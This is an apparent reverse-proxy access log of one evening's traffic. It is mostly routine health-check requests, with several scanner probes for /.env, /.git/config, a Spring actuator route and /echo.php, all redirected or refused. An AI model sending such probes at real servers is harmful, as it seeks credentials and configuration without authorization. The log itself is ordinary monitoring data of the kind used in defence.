159.203.109.206 - - [17/Dec/2023:21:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2387 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2388 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2389 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2390 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2391 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2392 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2393 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2394 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2395 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:21:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2396 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2397 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:21:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2398 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2399 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2400 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2401 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:21:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2402 "www@docker" "http://172.18.0.9:80" 0ms
54.36.115.221 - - [17/Dec/2023:21:14:23 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2403 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [17/Dec/2023:21:14:23 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2404 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:21:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2405 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2406 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2407 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2408 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2409 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2410 "www@docker" "http://172.18.0.9:80" 0ms
71.6.134.231 - - [17/Dec/2023:21:16:41 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2411 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:21:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2412 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2413 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2414 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:21:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2415 "www@docker" "http://172.18.0.9:80" 0ms
83.97.73.87 - - [17/Dec/2023:21:19:19 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 2416 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:21:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2417 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2418 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2419 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2420 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2421 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2422 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2423 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2424 "www@docker" "http://172.18.0.9:80" 0ms
45.79.168.172 - - [17/Dec/2023:21:23:06 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2425 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:21:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2426 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2427 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2428 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2429 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [17/Dec/2023:21:24:49 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2430 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:21:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2431 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2432 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2433 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2434 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2435 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:21:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2436 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2437 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2438 "www@docker" "http://172.18.0.9:80" 0ms
170.64.186.169 - - [17/Dec/2023:21:29:21 +0000] "GET /.git/config HTTP/1.1" 301 17 "-" "-" 2439 "web-to-websecure@internal" "-" 0ms
170.64.186.169 - - [17/Dec/2023:21:29:22 +0000] "GET /.git/config HTTP/1.1" 404 19 "-" "-" 2440 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:21:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2441 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2442 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2443 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2444 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2445 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2446 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2447 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2448 "www@docker" "http://172.18.0.9:80" 0ms
71.6.134.231 - - [17/Dec/2023:21:32:40 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2449 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:21:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2450 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2451 "www@docker" "http://172.18.0.9:80" 1ms
83.97.73.87 - - [17/Dec/2023:21:33:51 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 2452 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:21:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2453 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2454 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2455 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:21:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2456 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2457 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2458 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2459 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2460 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2461 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2462 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2463 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2464 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2465 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2466 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2467 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:21:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2468 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2469 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2470 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2471 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2472 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2473 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2474 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2475 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:21:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2476 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2477 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2478 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2479 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2480 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2481 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2482 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2483 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2484 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2485 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2486 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2487 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2488 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2489 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:21:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2490 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2491 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:21:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2492 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2493 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2494 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2495 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2496 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2497 "www@docker" "http://172.18.0.9:80" 0ms
201.182.218.37 - - [17/Dec/2023:21:56:29 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2498 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:21:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2499 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2500 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:21:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2501 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2502 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2503 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2504 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2505 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:22:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2506 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2507 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:22:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2508 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2509 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:22:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2510 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2511 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:22:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2512 "www@docker" "http://172.18.0.9:80" 0ms
185.236.231.45 - - [17/Dec/2023:22:03:23 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2513 "web-to-websecure@internal" "-" 0ms
185.236.231.45 - - [17/Dec/2023:22:03:23 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2514 "web-to-websecure@internal" "-" 0ms
185.236.231.45 - - [17/Dec/2023:22:03:24 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 2515 "-" "-" 0ms
185.236.231.45 - - [17/Dec/2023:22:03:24 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 2516 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:22:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2517 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:22:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2518 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2519 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:22:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2520 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2521 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:22:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2522 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2523 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:22:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2524 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2525 "www@docker" "http://172.18.0.9:80" 0ms
185.142.236.41 - - [17/Dec/2023:22:07:46 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2526 "-" "-" 0ms
185.142.236.41 - - [17/Dec/2023:22:08:09 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 2527 "-" "-" 0ms
185.142.236.41 - - [17/Dec/2023:22:08:12 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 2528 "-" "-" 0ms
185.142.236.41 - - [17/Dec/2023:22:08:14 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 19 "-" "-" 2529 "-" "-" 0ms
185.142.236.41 - - [17/Dec/2023:22:08:16 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 2530 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:22:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2531 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2532 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:22:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2533 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2534 "www@docker" "http://172.18.0.9:80" 0ms
57.129.23.166 - - [17/Dec/2023:22:09:38 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2535 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [17/Dec/2023:22:09:38 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2536 "web-to-websecure@internal" "-" 0ms
143.110.222.166 - - [17/Dec/2023:22:09:47 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2537 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:22:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2538 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2539 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:22:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2540 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2541 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:22:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2542 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:22:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2543 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:22:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2544 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2545 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:22:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2546 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2547 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:22:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2548 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2549 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:22:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2550 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2551 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:22:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2552 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2553 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:22:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2554 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2555 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:22:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2556 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2557 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:22:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2558 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2559 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:22:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2560 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2561 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:22:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2562 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:22:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2563 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:22:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2564 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2565 "www@docker" "http://172.18.0.9:80" 0ms
5.188.210.227 - - [17/Dec/2023:22:24:22 +0000] "GET /echo.php HTTP/1.1" 301 17 "-" "-" 2566 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:22:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2567 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2568 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:22:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2569 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:22:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2570 "www@docker" "http://172.18.0.9:80" 0ms
